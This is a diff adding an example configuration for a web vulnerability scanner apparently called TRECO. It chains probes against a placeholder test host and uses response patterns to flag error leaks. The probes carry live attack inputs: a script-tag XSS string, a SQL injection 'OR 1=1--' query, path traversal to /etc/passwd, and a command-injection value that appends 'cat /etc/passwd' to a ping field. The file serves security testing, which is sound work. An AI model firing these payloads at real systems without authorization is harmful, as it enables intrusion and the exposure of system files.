@@ -1,0 +1,338 @@
+# ============================================================================
+# TRECO Configuration: Error Detection and Analysis
+# ============================================================================
+#
+# Demonstrates using when blocks to detect different error types in
+# responses and route to appropriate analysis states based on error patterns.
+#
+# Usage:
+#   treco examples/error-detection.yaml
+#
+# ============================================================================
+
+metadata:
+  name: "Error Detection and Analysis"
+  version: "1.0"
+  author: "TRECO Team"
+  vulnerability: "CWE-209"
+  description: |
+    Uses multi-condition when blocks to detect and analyze various error
+    types including SQL errors, stack traces, and debug information leaks.
+
+target:
+  host: "vulnerable-app.test"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false
+  http:
+    follow_redirects: false
+
+entrypoint:
+  state: basic_request
+  input:
+    user_id: "1"
+    search_term: "test"
+
+# ============================================================================
+# STATES
+# ============================================================================
+
+states:
+
+  # --------------------------------------------------------------------------
+  # Initial Requests
+  # --------------------------------------------------------------------------
+  basic_request:
+    description: "Normal request to establish baseline"
+    request: |
+      GET /api/users/{{ user_id }} HTTP/1.1
+      Host: {{ target.host }}
+
+    extract:
+      user_data:
+        type: jpath
+        pattern: "$.user"
+
+    next:
+      # Success - no errors
+      - when:
+          - status: 200
+          - body_not_contains: "error"
+          - body_not_contains: "exception"
+        goto: malformed_request
+
+      # Server error with potential info leak
+      - when:
+          - status_range: [500, 599]
+        goto: analyze_server_error
+
+      - otherwise:
+        goto: malformed_request
+
+  # --------------------------------------------------------------------------
+  # Error Injection Tests
+  # --------------------------------------------------------------------------
+  malformed_request:
+    description: "Send malformed request to trigger errors"
+    request: |
+      GET /api/users/invalid-id-<script>alert(1)</script> HTTP/1.1
+      Host: {{ target.host }}
+
+    next:
+      # SQL Injection error detected
+      - when:
+          - body_matches: ".*SQL.*syntax.*"
+        goto: sql_injection_detected
+
+      # XSS reflected in error
+      - when:
+          - body_contains: "<script>"
+        goto: xss_in_error_detected
+
+      # Generic error
+      - when:
+          - status_range: [400, 499]
+        goto: client_error_analysis
+
+      - otherwise:
+        goto: search_injection
+
+  search_injection:
+    description: "Test search functionality for injection"
+    request: |
+      GET /api/search?q={{ search_term }}' OR 1=1-- HTTP/1.1
+      Host: {{ target.host }}
+
+    extract:
+      error_message:
+        type: jpath
+        pattern: "$.error"
+
+    next:
+      # SQL error in search
+      - when:
+          - body_matches: ".*mysql.*|.*postgresql.*|.*oracle.*"
+        goto: sql_injection_detected
+
+      # Search successful (potential SQLi)
+      - when:
+          - status: 200
+          - condition: "{{ error_message == None }}"
+        goto: search_injection_success
+
+      - otherwise:
+        goto: file_inclusion_test
+
+  file_inclusion_test:
+    description: "Test for file inclusion vulnerabilities"
+    request: |
+      GET /api/download?file=../../etc/passwd HTTP/1.1
+      Host: {{ target.host }}
+
+    next:
+      # File inclusion detected
+      - when:
+          - status: 200
+          - body_matches: ".*root:.*:0:0:.*"
+        goto: file_inclusion_detected
+
+      # Error with path disclosure
+      - when:
+          - body_matches: ".*(/var/www|/home|C:\\\\).*"
+        goto: path_disclosure_detected
+
+      - otherwise:
+        goto: command_injection_test
+
+  command_injection_test:
+    description: "Test for command injection"
+    request: |
+      POST /api/utils/ping HTTP/1.1
+      Host: {{ target.host }}
+      Content-Type: application/json
+      
+      {
+        "host": "127.0.0.1; cat /etc/passwd"
+      }
+
+    next:
+      # Command injection successful
+      - when:
+          - status: 200
+          - body_matches: ".*root:.*:0:0:.*"
+        goto: command_injection_detected
+
+      # Shell error in response
+      - when:
+          - body_matches: ".*sh:.*command not found.*"
+        goto: command_error_detected
+
+      - otherwise:
+        goto: end
+
+  # --------------------------------------------------------------------------
+  # Error Analysis States
+  # --------------------------------------------------------------------------
+  analyze_server_error:
+    description: "Analyze server error for information disclosure"
+    request: |
+      GET /api/trigger-error HTTP/1.1
+      Host: {{ target.host }}
+
+    next:
+      # Stack trace detected
+      - when:
+          - body_matches: ".*at .*\\(.*\\.py:[0-9]+\\).*"
+        goto: stack_trace_detected
+
+      # Java stack trace
+      - when:
+          - body_matches: ".*at .*\\..*\\..*\\(.*\\.java:[0-9]+\\).*"
+        goto: stack_trace_detected
+
+      # Debug mode enabled
+      - when:
+          - body_contains: "debug mode"
+        goto: debug_mode_detected
+
+      # Database connection error
+      - when:
+          - body_matches: ".*could not connect.*database.*"
+        goto: database_error_detected
+
+      - otherwise:
+        goto: generic_error
+
+  client_error_analysis:
+    description: "Analyze client error responses"
+    next:
+      - when:
+          - status: 400
+          - body_contains: "validation"
+        goto: validation_error
+
+      - when:
+          - status: 401
+        goto: auth_error
+
+      - when:
+          - status: 403
+        goto: forbidden_error
+
+      - when:
+          - status: 404
+        goto: not_found_error
+
+      - otherwise:
+        goto: generic_error
+
+  # --------------------------------------------------------------------------
+  # Vulnerability Detection States
+  # --------------------------------------------------------------------------
+  sql_injection_detected:
+    description: "SQL injection vulnerability detected"
+    extract:
+      error_type:
+        type: regex
+        pattern: "(mysql|postgresql|oracle|mssql|sqlite)"
+
+    next:
+      - goto: end
+
+  xss_in_error_detected:
+    description: "XSS in error message detected"
+    next:
+      - goto: end
+
+  search_injection_success:
+    description: "Search injection potentially successful"
+    next:
+      - goto: end
+
+  file_inclusion_detected:
+    description: "File inclusion vulnerability detected"
+    next:
+      - goto: end
+
+  path_disclosure_detected:
+    description: "Path disclosure in error message"
+    extract:
+      disclosed_path:
+        type: regex
+        pattern: "(/[^\\s]+|[A-Z]:\\\\[^\\s]+)"
+
+    next:
+      - goto: end
+
+  command_injection_detected:
+    description: "Command injection successful"
+    next:
+      - goto: end
+
+  command_error_detected:
+    description: "Command execution attempted (error returned)"
+    next:
+      - goto: end
+
+  stack_trace_detected:
+    description: "Stack trace information disclosure"
+    extract:
+      framework:
+        type: regex
+        pattern: "(django|flask|spring|express)"
+
+    next:
+      # Check if debug mode is also enabled
+      - when:
+          - body_contains: "DEBUG = True"
+        goto: debug_mode_detected
+
+      - otherwise:
+        goto: end
+
+  debug_mode_detected:
+    description: "Debug mode enabled - detailed error information exposed"
+    next:
+      - goto: end
+
+  database_error_detected:
+    description: "Database error exposed"
+    extract:
+      db_host:
+        type: regex
+        pattern: "host[=:]\\s*([^\\s,]+)"
+
+    next:
+      - goto: end
+
+  validation_error:
+    description: "Validation error"
+    next:
+      - goto: end
+
+  auth_error:
+    description: "Authentication error"
+    next:
+      - goto: end
+
+  forbidden_error:
+    description: "Access forbidden"
+    next:
+      - goto: end
+
+  not_found_error:
+    description: "Resource not found"
+    next:
+      - goto: end
+
+  generic_error:
+    description: "Generic error - no specific vulnerability detected"
+    next:
+      - goto: end
+
+  # --------------------------------------------------------------------------
+  # Terminal State
+  # --------------------------------------------------------------------------
+  end:
+    description: "Error detection testing complete"
